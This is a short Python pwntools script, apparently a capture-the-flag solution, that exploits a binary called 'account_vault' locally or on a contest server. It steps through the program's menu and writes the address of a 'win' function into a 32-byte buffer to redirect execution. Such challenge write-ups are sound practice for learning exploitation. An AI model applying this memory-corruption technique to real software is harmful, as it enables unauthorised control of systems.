#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./account_vault', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13548)
    return process(elf.path)

p = conn()

win = elf.sym.win

p.sendlineafter(b'> ', b'1')                        
p.sendlineafter(b'> ', b'2')                     
p.sendlineafter(b'> ', b'3')                       
p.sendafter(b'data: ', p64(win).ljust(32, b'X'))
p.sendlineafter(b'> ', b'4')            

print(p.recvall(timeout=2).decode(errors='replace'))
